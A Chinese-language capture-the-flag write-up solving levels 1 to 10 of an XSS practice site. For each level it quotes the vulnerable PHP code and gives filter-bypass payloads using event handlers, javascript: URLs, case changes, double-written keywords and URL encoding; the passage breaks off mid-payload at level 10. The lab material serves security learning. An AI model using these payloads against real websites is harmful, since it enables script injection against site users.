---
title: xss挑战之旅
url: https://buaq.net/go-146545.html
source: unSafe.sh - 不安全
date: 2023-01-24
fetch_date: 2025-10-04T04:37:05.073793
---

# xss挑战之旅

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/dde6bc34576da19a368b404a44029040.jpg)

xss挑战之旅

level1url：http://xss-ctf.xiejiahe.com/level1?name=test关键代码分析ini\_set("display\_e
*2023-1-23 15:19:34
Author: [xz.aliyun.com(查看原文)](/jump-146545.htm)
阅读量:32
收藏*

---

## **level1**

url：<http://xss-ctf.xiejiahe.com/level1?name=test>

关键代码分析

```
ini_set("display_errors", 0);

$str = $_GET["name"];

echo "<h2 align=center>欢迎用户".$str."</h2>";
```

输入test<，可以看到没有任何过滤

![](https://img-blog.csdnimg.cn/dd50b52865644f449b4ed3da5d7d3037.png)

通过url进行控制，常用payload

```
<script>alert('xss')</script>
<svg/onload=alert('xss')>
```

![](https://img-blog.csdnimg.cn/b511c04b15c24ae38ba8ec74145a705d.png)

```
<script>prompt('xss')</script>
```

![](https://img-blog.csdnimg.cn/e43ca817179a4e3b88fd4cf9f27011ce.png)

```
<script>confirm('xss')</script>
```

![](https://img-blog.csdnimg.cn/6fe2f5a1e2774000bbce8456c448b122.png)

## **level2**

url：<http://xss-ctf.xiejiahe.com/level2?keyword=test>

关键代码分析

```
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level2.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
```

使用GET方法，从url中接受一个keyword搜索参数，此处用到了一个过滤函数htmlspecialchars()，这个函数把预定义的字符转换为HTML实体

本题是搜索型xss

输入常见的payload：`<script>alert('xss')</script>`

没有弹窗，审查元素可以看到的输入的XSS语句被赋值给value并且在input标签里，所以我们需要闭合value和input标签才可以正常弹窗

![](https://img-blog.csdnimg.cn/884daeb784ef43f2873d24a3f21a16cf.png)

输入框构造常用payload：

`" onmouseover=alert(/xss/)>click`

当鼠标移动到搜索框就会触发弹窗

![](https://img-blog.csdnimg.cn/23aa9a5e7b2146d793031777ee015715.png)

审查元素，可以看到我们的输入变成了

![](https://img-blog.csdnimg.cn/d405dfbefc8f4b82979defeca636e62c.png)

`"><script>alert(/xss/)</script>`

![](https://img-blog.csdnimg.cn/5328319c8a274ef0a63ecfed44a8dc9f.png)

`"><script>confirm(/xss/)</script>`

![](https://img-blog.csdnimg.cn/3ae70d3de20b41c8ace9aee58a9d89ad.png)

`"><script>prompt(/xss/)</script>`

![](https://img-blog.csdnimg.cn/b9252f918e764dd9a5048ff22e1941c0.png)

其它payload:

```
其它payload:
" onchange=alert`document.domain` //  要在输入框里再次输入参数，并按下空格，才会弹窗
" oninput=alert`document.domain` // 要在输入框里再次输入参数
" onfocus=alert(document.domain) autofocus；// 要再次单击搜索框
```

## **level3**

url：<http://xss-ctf.xiejiahe.com/level3?keyword=wait>

关键源代码分析

```
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level3.php method=GET>
<input name=keyword value="'.$str3.'">
<input type=submit name=submit value=搜索 />
```

发现过滤了 < 和 >使用的str\_replace函数，需要用 " 闭合value标签。注意：str\_replace函数是区分大小写的，str\_ireplace函数不区分大小写，所以有时候我们还可以利用大小写绕过。

构造payload：

`' onclick=alert(/xss/)//`

输入payload后，单击搜索框，就会触发弹窗

![](https://img-blog.csdnimg.cn/a59f5e4729f8443ca7741c547718da28.png)

审查元素发现我们的输入变成了

![](https://img-blog.csdnimg.cn/3f3ced9c4d8a4e8da65cc6b01a177cad.png)

```
' onmouseover=alert('xss')//   当鼠标移动到搜索框触发弹窗
' oninput=alert`xss` //
' oninput=alert`xss` '   要在输入框内再次输入参数触发弹窗
' onchange=alert`xss` //
' onchange=alert`xss` '   要在输入框里再次输入参数，并按下空格，才会弹窗
```

## **level4**

url：<http://xss-ctf.xiejiahe.com/level4?keyword=try%20harder!>

关键源码分析

![](https://img-blog.csdnimg.cn/e4c67784ff524e51b94b9820e4760e9a.png)

可以看到，传入进去的值经过了两个函数的参与，str\_replace(">","",$str)，此函数是将变量str中的字符>转换为空，转换时区分大小写；同样也把<转换为空，然后再经过函数的过滤转化，这时要在没有符号“<>”，的情况下构造语句，并且不被htmlspecialchars()函数影响。所以这里可以构造一个输入到文本框后出现相应的事件。

构造payload：

`" onfocus=alert(xss) autofocus="`

![](https://img-blog.csdnimg.cn/42b247903a1d4e9eb39ef0a1aa25dec6.png)

onfocus事件：定义的事件将在对象获得焦点时触发，这里指input标签获得焦点。

autofocus属性：input标签的属性，当页面加载input标签，自动获得焦点。

焦点：这里指你的光标的位置，也就是说当你的光标出现在input文本框这里，将进行onfocus事件的发生。

其它payload：

```
" onmouseover=alert('xss')   当鼠标移动到搜索框触发弹窗
" oninput=alert`xss`  要在输入框内再次输入参数触发弹窗
" onchange=alert`xss`//
" onchange=alert`xss` '   要在输入框里再次输入参数，并按下空格，才会弹窗
```

## **level5**

url：<http://xss-ctf.xiejiahe.com/level5?keyword=find%20a%20way%20out!>

关键代码分析

![](https://img-blog.csdnimg.cn/ccbfbf9e844b4c40889f948d763044a9.png)

看一下源代码，str2=strreplace("<script","<scr\_ipt",str)，str3=strreplace("on","o\_n",str2)是把<script转换为<scr\_ipt，on转换成o\_n，这样就过滤了js事件，过滤了script标签和on标签，str=strtolower(\_GET[''keyword"]);大小写绕过也会失效，不过这次没有过滤尖括号><，没过滤a标签，可以使用伪协议来构造payload：

`"><iframe src=javascript:alert(/xss/)>`

![](https://img-blog.csdnimg.cn/5d2b90a5217f40c1a4a99fc2c2da05d2.png)

```
"> <a href="javascript:%61lert(5)">click me !!!</a>
```

点击click me,成功弹窗

![](https://img-blog.csdnimg.cn/6d3034f315a24071a27c00da3e996479.png)

`"><a href=" javascript:alert(/xss/)"`

点击payload的长度为36，触发弹窗

![](https://img-blog.csdnimg.cn/d4a96147d4834b6fb4c3aaf1ef18a763.png)

## **level6**

url：<http://xss-ctf.xiejiahe.com/level6?keyword=break%20it%20out!>

关键源码分析

![](https://img-blog.csdnimg.cn/cdf4623e20704522bb14e50bed1be3f6.png)

由于是用str\_replace函数来过滤的，这一关没有对大小写的限制，所以我们可以通过大小写变换来绕过。

构造payload：

`"> <SCRIpt>alert(/xss/)</SCriPT>`

`"> <img Src=a ONerrOR=alert(/xss/)>`

![](https://img-blog.csdnimg.cn/ba803fdfb9cc48d9beb31ab496e14e5e.png)

```
"> <a HrEf="javascript:alert(/xss/)">click me!!!</a> 还要点击click me
```

![](https://img-blog.csdnimg.cn/f45e7618c2114741a41935514d8e5d93.png)

审查元素

![](https://img-blog.csdnimg.cn/8c588f20379f4463a59c0105d9dcdb1c.png)

`" ONclick=alert(/xss/) //`还要点击输入框

![](https://img-blog.csdnimg.cn/7b5ce65d77b04f988c123bc0037dec20.png)

`"><svg x="" ONclick=alert(/xss/)>` 点击这个区域才会触发弹窗

![](https://img-blog.csdnimg.cn/f8dcf58202c04ed982ae42f191fb127a.png)

## **level7**

url：<http://xss-ctf.xiejiahe.com/level7?keyword=move%20up!>

关键源码分析

![](https://img-blog.csdnimg.cn/5a83a467a8f3474dbcd9f2c339c375de.png)

审查代码，我们可以发现script，on，src，data，href都被转换成空了，大小写也不能用了，所以本题我们可以尝试双写绕过。

构造 payload：

`" oonnclick=alert(/xss/)//` 点击搜索框，触发弹窗

![](https://img-blog.csdnimg.cn/eb0a0ffcba2548c787996b8aa0987fbe.png)

`" oonnmouseover=alert(/xss/)//` 鼠标移动到输入框出触发弹窗

`" oonninput=alert(/xss/) "` 要在输入框内再次输入参数，才会触发弹窗

## **level8**

url：[http://xss-ctf.xiejiahe.com/level8?](http://xss-ctf.xiejiahe.com/level8)

关键代码分析

![](https://img-blog.csdnimg.cn/fd5e33364c7c46ddb344d194669ca0f2.png)

通过审查源代码我们可以发现，"script"转换为"scr\_ipt"，"on"转换为"o\_n"，"src"转换为"sr\_c"，"data"转换为"da\_ta"，"href"转换为"hr\_ef"，'"'转换为'&quot'，大小写过滤并被编码，尖括号><，单引号'，%，#，&符号没有被过滤，输出点在a标签内，href属性中，属性里的双引号被转换成HTML实体，无法截断属性，这里可以使用伪协议绕过javascript:alert，javascript:伪协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行，由于script关键字被过滤，javascript会被替换成javasc\_ript，使用&#x72来代替r,伪协议后面可以使用URL编码进行编码。

Payload：

```
javascript:%61lert(/XSS/)
javascript:%61lert`/xss/`
javascript:alert`/xss/`
```

审查元素

![](https://img-blog.csdnimg.cn/9a7000a6fdb941bcb77e71e5979e5a9e.png)

点击友情链接

![](https://img-blog.csdnimg.cn/0419bd782b4b47aab50d781a7d38fa79.png)

## **level9**

url：<http://xss-ctf.xiejiahe.com/level9?keyword=not%20bad!>

关键代码分析

![](https://img-blog.csdnimg.cn/f9482336861f4539aec18a35a052a0b8.png)

通过审查源码发现"script"转换为"scr\_ipt"，"on"转换为"o\_n"，"src"转换为"sr\_c"，"data"转换为"da\_ta"，"href"转换为"hr\_ef"，'"'转换为'&quot'，和上一关差不多，不同的是多了自动检测URL，如果发现没有带<http://内容则会显示为不合法。>

构造payload：

```
javascript:alert(1)//http://

javascript:%0dhttp://%0dalert(/xss/)
```

审查元素

![](https://img-blog.csdnimg.cn/0efd9ece50d941d7999dd44ea209e480.png)

点击友情链接

![](https://img-blog.csdnimg.cn/337d1fc60cd24f578a204261a036eddd.png)

## **level10**

url：<http://xss-ctf.xiejiahe.com/level10?keyword=well%20done!>

关键代码分析

![](https://img-blog.csdnimg.cn/31578955eb1b4a76ad2c1021a3214115.png)

通过审查源码发现需要两个参数，一个是keyword，一个是t\_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框，或许可以从隐藏的输入框下手，构造payload。

payload：

```
keyword=test&t_sort="type="text" onclick="alert(/...